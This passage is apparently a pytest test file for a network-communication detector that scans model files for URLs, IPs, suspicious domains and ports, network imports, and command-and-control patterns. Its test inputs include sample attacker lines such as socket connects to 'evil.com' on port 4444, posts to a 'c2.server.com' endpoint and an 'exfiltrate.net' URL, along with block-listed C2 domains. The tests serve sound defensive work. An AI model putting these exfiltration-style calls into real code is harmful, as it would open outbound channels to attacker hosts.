        assert not [finding for finding in findings if finding["type"] == "ipv4_address"]

    def test_detect_ipv6_addresses(self) -> None:
        """Test detection of IPv6 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        2001:0db8:85a3:0000:0000:8a2e:0370:7334
        fe80:0000:0000:0000:0202:b3ff:fe1e:8329
        """

        findings = detector.scan(data)
        ipv6_findings = [f for f in findings if f["type"] == "ipv6_address"]

        assert len(ipv6_findings) == 2

    def test_detect_domain_names(self) -> None:
        """Test detection of domain names."""
        detector = NetworkCommDetector()

        data = b"""
        connect to api.example.com
        download from cdn.badsite.tk
        upload to data-exfil.ml
        """

        findings = detector.scan(data)
        domain_findings = [f for f in findings if f["type"] == "domain_name"]

        assert len(domain_findings) >= 2  # Should detect suspicious TLDs

        # Check suspicious TLD detection
        suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
        assert len(suspicious) >= 2  # .tk and .ml are suspicious

    def test_ml_word_inside_real_domain_is_still_detected(self) -> None:
        """DNS-shaped endpoints containing ML terms should not be suppressed."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"connect to evil-weight-domain.com")

        assert any(
            finding["type"] == "domain_name" and finding["domain"] == "evil-weight-domain.com" for finding in findings
        )

    def test_tensor_method_calls_are_not_reported_as_domains(self) -> None:
        """Common tensor method calls should not be mistaken for DNS names."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"weight.to(device)\nbias.to(device)\n")

        assert not [finding for finding in findings if finding["type"] == "domain_name"]

    def test_detect_network_libraries(self) -> None:
        """Test detection of network library imports."""
        detector = NetworkCommDetector()

        data = b"""
        import socket
        from urllib import request
        import requests
        from paramiko import SSHClient
        """

        findings = detector.scan(data)
        lib_findings = [f for f in findings if f["type"] == "network_library"]

        assert len(lib_findings) >= 4

        # Check specific libraries
        libs = [f["library"] for f in lib_findings]
        assert "socket" in libs
        assert "urllib" in libs
        assert "requests" in libs
        assert "paramiko" in libs

        # Check severity levels
        critical = [f for f in lib_findings if f["severity"] == "CRITICAL"]
        assert len(critical) >= 2  # socket and paramiko are critical

    def test_network_library_scan_uses_shared_patterns(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Derived library patterns should come from the shared class table."""
        detector = NetworkCommDetector()
        monkeypatch.setattr(NetworkCommDetector, "NETWORK_LIBRARIES", [b"socket"])
        monkeypatch.setattr(NetworkCommDetector, "NETWORK_LIBRARY_PATTERNS", {b"socket": (b"CUSTOM_SOCKET_PATTERN",)})

        detector._scan_network_libraries(b"CUSTOM_SOCKET_PATTERN", "payload.bin")

        assert any(finding["library"] == "socket" for finding in detector.findings)

    def test_detect_network_functions(self) -> None:
        """Test detection of network function calls."""
        detector = NetworkCommDetector()

        data = b"""
        socket.connect(('evil.com', 4444))
        requests.post('http://c2.server.com/data', payload)
        urlopen('https://exfiltrate.net')
        ftp.connect('upload.server.com')
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) >= 4

        # Check specific functions
        funcs = [f["function"] for f in func_findings]
        assert "socket.connect" in funcs
        assert "requests.post" in funcs
        assert "urlopen" in funcs

    def test_network_function_snippets_redact_url_path_tokens(self) -> None:
        """URL-bearing snippets should not leak capability tokens after URL findings are redacted."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        data = f'requests.get("https://example.com/path/{path_token}/model.bin")'.encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>/model.bin"
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_network_function_snippets_expand_forward_urls_before_redaction(self) -> None:
        """Long URL tails after the function token should be included before URL redaction."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        long_prefix = "a" * 90
        data = f'requests.get("https://example.com/{long_prefix}/{path_token}/model.bin")'.encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"].endswith(f"/{long_prefix}/<redacted>/model.bin")
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_network_function_snippet_expansion_is_bounded_without_nearby_url_scheme(self) -> None:
        """Incidental matches in long binary blobs should not expand snippets across megabytes."""
        detector = NetworkCommDetector()
        data = b"https://example.com/" + (b"a" * 6000) + b"requests.get("

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        snippet = network_finding["snippet"]

        assert len(snippet) <= 200
        assert "https://example.com" not in snippet

    def test_single_quoted_call_tail_does_not_prevent_path_token_redaction(self) -> None:
        """Call syntax after a URL should not stay attached to the secret token."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"requests.get('https://example.com/path/{path_token}',verify=True)".encode()

        findings = detector.scan(data, "hook.py")
        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>',verify=True)"
        assert path_token not in json.dumps([network_finding, url_finding], sort_keys=True)

    def test_cc_pattern_snippets_redact_partial_url_path_tokens(self) -> None:
        """C&C snippets should expand to the URL start before redacting path tokens."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        data = f"https://example.com/download/{path_token}/malware.bin".encode()

        findings = detector.scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>/malware.bin"
        assert path_token not in json.dumps([cc_finding, url_finding], sort_keys=True)

    def test_cc_pattern_snippet_url_expansion_is_bounded(self) -> None:
        """Long whitespace-free binary regions should not force unbounded URL scans."""
        detector = NetworkCommDetector()
        long_prefix = "a" * 6000
        data = f"https://example.com/{long_prefix}/malware.bin".encode()

        findings = detector.scan(data, "hook.py")
        cc_finding = next(finding for finding in findings if finding["type"] == "cc_pattern")

        assert cc_finding["pattern"] == "malware"
        assert len(cc_finding["snippet"]) < 200

    def test_network_functions_not_flagged_in_documentation_metadata_context(self) -> None:
        """Documentation prose should not report raw network library/function token mentions."""
        detector = NetworkCommDetector()
        data = b"This README says: import socket, requests.get, and urlopen are shown for examples."

        findings = detector.scan(data, "model_card.md")

        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]

    def test_network_function_with_parentheses_still_flagged_in_metadata_context(self) -> None:
        """Executable-looking calls should stay detectable even when embedded in metadata files."""
        detector = NetworkCommDetector()
        data = b'socket.connect(("api.example", 4444))'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "socket.connect" for finding in func_findings)

    def test_network_function_after_doc_token_still_flagged(self) -> None:
        """A prose token mention should not hide a later executable-looking function call."""
        detector = NetworkCommDetector()
        data = b'This README says requests.get is shown for examples.\nrequests.get("https://evil.example")'

        findings = detector.scan(data, "metadata.json")

        func_findings = [finding for finding in findings if finding["type"] == "network_function"]
        assert any(finding["function"] == "requests.get" for finding in func_findings)

    def test_network_library_with_realistic_prose_context_not_flagged(self) -> None:
        """Import-like words in prose should not be treated as network imports."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples."

        findings = detector.scan(data, "README.txt")

        assert not [finding for finding in findings if finding["type"] == "network_library"]

    def test_executable_metadata_named_path_still_flags_network_import(self) -> None:
        """Executable paths containing metadata-like words should not be treated as prose."""
        detector = NetworkCommDetector()
        data = b"import socket  # used by this metadata helper to open outbound connections"

        findings = detector.scan(data, "src/metadata_utils.py")

        assert any(finding["type"] == "network_library" for finding in findings)

    def test_metadata_context_without_prose_marker_still_flags_network_import(self) -> None:
        """Metadata filenames alone should not suppress executable-looking imports."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket then send payload"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_metadata_context_with_marker_in_structured_hook_still_flags_network_import(self) -> None:
        """Marker words in structured metadata should not hide executable import text."""
        detector = NetworkCommDetector()
        data = b'{"hook": "import socket includes callback"}'

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_comment_prose_marker_after_code_still_flags_network_import(self) -> None:
        """Inline prose markers should not hide executable import statements."""
        detector = NetworkCommDetector()
        data = b"if True: import socket  # for outbound callback"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_inline_compound_statement_with_prose_marker_still_flags_network_import(self) -> None:
        """Compound statements should stay executable even when comments look prose-like."""
        detector = NetworkCommDetector()
        data = b"for _ in [0]: import socket  # examples"

        findings = detector.scan(data, "metadata.json")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_newline_free_binary_prose_marker_does_not_hide_later_import(self) -> None:
        """A prose marker far away in a binary blob should not suppress a later import token."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes examples " + (b"x" * 600) + b"import socket"

        findings = detector.scan(data, "model.pkl")

        assert any(finding["type"] == "network_library" and finding["library"] == "socket" for finding in findings)

    def test_network_library_after_doc_import_still_flagged(self) -> None:
        """A prose import mention should not hide a later executable import."""
        detector = NetworkCommDetector()
        data = b"Model documentation includes import socket for demos and troubleshooting examples.\nimport socket"

        findings = detector.scan(data, "README.txt")

        lib_findings = [finding for finding in findings if finding["type"] == "network_library"]
        assert any(finding["library"] == "socket" for finding in lib_findings)

    def test_detect_cc_patterns(self) -> None:
        """Test detection of command & control patterns."""
        detector = NetworkCommDetector()

        data = b"""
        beacon_url = "http://c2.server.com"
        callback_url = config['server']
        malware_config = {"backdoor": True}
        botnet_id = "zombie123"
        """

        findings = detector.scan(data)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]

        assert len(cc_findings) >= 4

        # All C&C patterns should be critical
        assert all(f["severity"] == "CRITICAL" for f in cc_findings)

        # Check specific patterns
        patterns = [f["pattern"] for f in cc_findings]
        assert "beacon_url" in patterns
        assert "malware" in patterns
        assert "backdoor" in patterns
        assert "botnet" in patterns

    def test_cc_pattern_scan_reuses_lowered_payload(self) -> None:
        """Reuse one lowercase payload view across all C&C pattern checks."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector()
        data = TrackingBytes(b'payload = {"malware": True, "backdoor": True}')

        detector._scan_cc_patterns(data, "payload.bin")

        assert data.lower_calls == 1
        assert {finding["pattern"] for finding in detector.findings} >= {"malware", "backdoor"}

    def test_benign_metadata_reference_keys_are_not_cc_patterns(self) -> None:
        """Common model metadata URL keys are not C&C indicators by themselves."""
        detector = NetworkCommDetector()

        data = b"""
        {
            "download_url": "https://huggingface.co/example/model",
            "report_url": "https://huggingface.co/example/model/blob/main/README.md",
            "telemetry_endpoint": "disabled",
            "heartbeat_interval": 30,
            "keepalive": true,
            "update_server": "none",
            "upload_endpoint": "none"
        }
        """

        findings = detector.scan(data)
        cc_patterns = {f["pattern"] for f in findings if f["type"] == "cc_pattern"}

        assert cc_patterns.isdisjoint(
            {
                "download_url",
                "report_url",
                "telemetry_endpoint",
                "heartbeat",
                "keepalive",
                "update_server",
                "upload_endpoint",
            }
        )

    def test_detect_suspicious_ports(self) -> None:
        """Test detection of suspicious port numbers."""
        detector = NetworkCommDetector()

        data = b"""
        connect to server:1337
        ssh port=22
        PORT=4444
        redis:6379
        """

        findings = detector.scan(data)
        port_findings = [f for f in findings if f["type"] == "suspicious_port"]

        assert len(port_findings) >= 4

        # Check specific ports
        ports = [f["port"] for f in port_findings]
        assert 1337 in ports  # Common backdoor
        assert 22 in ports  # SSH
        assert 4444 in ports  # Metasploit
        assert 6379 in ports  # Redis

    def test_suspicious_port_scan_performance(self) -> None:
        """Ensure port scanning remains performant with precompiled patterns."""
        detector = NetworkCommDetector()
        data = b"connect to server:1337" * 100
        context = "model.bin"

        import time

        start = time.perf_counter()
        # Fewer iterations in CI environments
        iterations = 20 if _is_ci_environment() else 50
        for _ in range(iterations):
            detector.findings = []
            detector._scan_suspicious_ports(data, context)
        duration = time.perf_counter() - start

        assert duration < 1.0

    def test_port_name_lookup_uses_shared_mapping(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Port-name lookup should reuse the shared class mapping."""
        detector = NetworkCommDetector()
        monkeypatch.setattr(NetworkCommDetector, "PORT_NAMES", {9999: "Custom Service"})

        assert detector._get_port_name(9999) == "Custom Service"
        assert detector._get_port_name(22) == "Unknown"

    def test_blacklist_detection(self) -> None:
        """Test detection of blacklisted domains when configured."""
        # Configure with specific blacklisted domains
        config = {"custom_blacklist": [b"malicious-site.com", b"known-c2.net", b"phishing-domain.org"]}
        detector = NetworkCommDetector(config)

        data = b"""
        http://malicious-site.com/payload
        connect to known-c2.net
        upload to phishing-domain.org
        """

        findings = detector.scan(data)
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]

        assert len(blacklist_findings) >= 3

        # Blacklisted domains should have max confidence
        assert all(f["confidence"] == 1.0 for f in blacklist_findings)
        assert all(f["severity"] == "CRITICAL" for f in blacklist_findings)

    def test_blacklist_scan_reuses_lowered_payload(self) -> None:
        """Reuse one lowercase payload view across configured blacklist checks."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector({"custom_blacklist": [b"blocked.example", b"evil.example"]})
        data = TrackingBytes(b"https://blocked.example/payload")

        detector._check_blacklist(data, "payload.bin")

        assert data.lower_calls == 1
        assert [finding["domain"] for finding in detector.findings] == ["blocked.example"]

    def test_blacklist_scan_skips_lowering_without_configured_domains(self) -> None:
        """Avoid touching payload bytes when no blacklist entries are configured."""

        class TrackingBytes(bytes):
            lower_calls = 0

            def lower(self) -> bytes:
                self.lower_calls += 1
                return super().lower()

        detector = NetworkCommDetector()
        data = TrackingBytes(b"https://blocked.example/payload")

        detector._check_blacklist(data, "payload.bin")

        assert data.lower_calls == 0
        assert detector.findings == []

    def test_custom_config(self) -> None:
        """Test custom configuration options."""
        config = {
            "custom_cc_patterns": [b"custom_beacon", b"my_backdoor"],
            "custom_blacklist": [b"custom-evil.com", b"my-c2.net"],
        }
        detector = NetworkCommDetector(config)

        data = b"""
        custom_beacon = "http://server.com"
        my_backdoor.connect()
        http://custom-evil.com
        connect to my-c2.net
        """

        findings = detector.scan(data)

        # Check custom C&C patterns
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        patterns = [f["pattern"] for f in cc_findings]
        assert "custom_beacon" in patterns
        assert "my_backdoor" in patterns

        # Check custom blacklist
        blacklist_findings = [f for f in findings if f["type"] == "blacklisted_domain"]
        domains = [f["domain"] for f in blacklist_findings]
        assert any(domain == "custom-evil.com" for domain in domains)
        assert any(domain == "my-c2.net" for domain in domains)

    def test_custom_patterns_isolated_between_instances(self) -> None:
        """Ensure custom patterns and blacklists do not leak between instances."""
        config = {
            "custom_cc_patterns": ["LEAK_PATTERN"],
            "custom_blacklist": ["LEAK.example"],
        }
        detector_with_custom = NetworkCommDetector(config)
        detector_default = NetworkCommDetector()

        data = b"LEAK_PATTERN http://LEAK.example"

        findings_custom = detector_with_custom.scan(data)
        assert any(f["type"] == "cc_pattern" and f["pattern"] == "leak_pattern" for f in findings_custom)
        assert any(f["type"] == "blacklisted_domain" and f["domain"] == "leak.example" for f in findings_custom)

        findings_default = detector_default.scan(data)
        assert all(f["type"] != "cc_pattern" for f in findings_default)
        assert all(f["type"] != "blacklisted_domain" for f in findings_default)

    def test_confidence_scoring(self) -> None:
        """Test confidence scoring for different patterns."""
        detector = NetworkCommDetector()

        data = b"""
        http://normal-site.com
        http://evil-site.tk:1337/cmd
        192.168.1.1
        8.8.8.8
        malware_config = {}
        import json
        import socket
        """

        findings = detector.scan(data)

        # URL with suspicious port should have higher confidence
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        suspicious_urls = [f for f in url_findings if ":1337" in f["url"]]
        assert all(f["confidence"] >= 0.8 for f in suspicious_urls)

        # Private IPs should have lower confidence than public
        ip_findings = [f for f in findings if "ipv4" in f["type"]]
        private_ips = [f for f in ip_findings if f.get("is_private")]
        public_ips = [f for f in ip_findings if f.get("is_global")]

        if private_ips and public_ips:
            assert max(f["confidence"] for f in private_ips) < max(f["confidence"] for f in public_ips)

        # Malware patterns should have high confidence
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        malware_findings = [f for f in cc_findings if "malware" in f["pattern"]]
        assert all(f["confidence"] >= 0.95 for f in malware_findings)

    def test_no_false_positives_on_clean_data(self) -> None:
        """Test that clean model data doesn't trigger false positives."""
        detector = NetworkCommDetector()

        # Clean model data with some numbers that could look like IPs
        data = b"""
        model_weights = [1.2, 3.4, 5.6, 7.8]
        layer_sizes = [224, 224, 3]
        version = "2.0.1.1"
        optimizer = "adam"
        loss = 0.001
        """

        findings = detector.scan(data)

        # Should not detect version numbers as IPs
        ip_findings = [f for f in findings if "ip" in f["type"]]
        assert len(ip_findings) == 0

        # Should not detect any network patterns
        assert len(findings) == 0

    def test_context_extraction(self) -> None:
        """Test that context/snippets are properly extracted."""
        detector = NetworkCommDetector()

        data = b"""
        This is some context before
        socket.connect(('evil.com', 4444))
        and some context after
        """

        findings = detector.scan(data)
        func_findings = [f for f in findings if f["type"] == "network_function"]

        assert len(func_findings) > 0

        # Check that snippet contains surrounding context
        snippet = func_findings[0].get("snippet", "")
        assert "context before" in snippet or "context after" in snippet


class TestDetectNetworkCommunication:
    """Test the convenience function."""

    def test_scan_file(self, tmp_path: Path) -> None:
        """Test scanning a file for network patterns."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"http://malicious.com/payload")

        findings = detect_network_communication(str(test_file))
        assert len(findings) > 0
        assert any(urlparse(f.get("url", "")).hostname == "malicious.com" for f in findings)

    def test_file_not_found(self) -> None:
        """Test handling of non-existent files."""
        findings = detect_network_communication("/non/existent/file.pkl")
        assert len(findings) == 1
        assert findings[0]["type"] == "error"
        assert "not found" in findings[0]["message"]

    def test_with_config(self, tmp_path: Path) -> None:
        """Test scanning with custom configuration."""
        test_file = tmp_path / "model.pkl"
        test_file.write_bytes(b"my_custom_pattern")

        config = {"custom_cc_patterns": [b"my_custom_pattern"]}

        findings = detect_network_communication(str(test_file), config)
        cc_findings = [f for f in findings if f["type"] == "cc_pattern"]
        assert len(cc_findings) == 1
        assert cc_findings[0]["pattern"] == "my_custom_pattern"
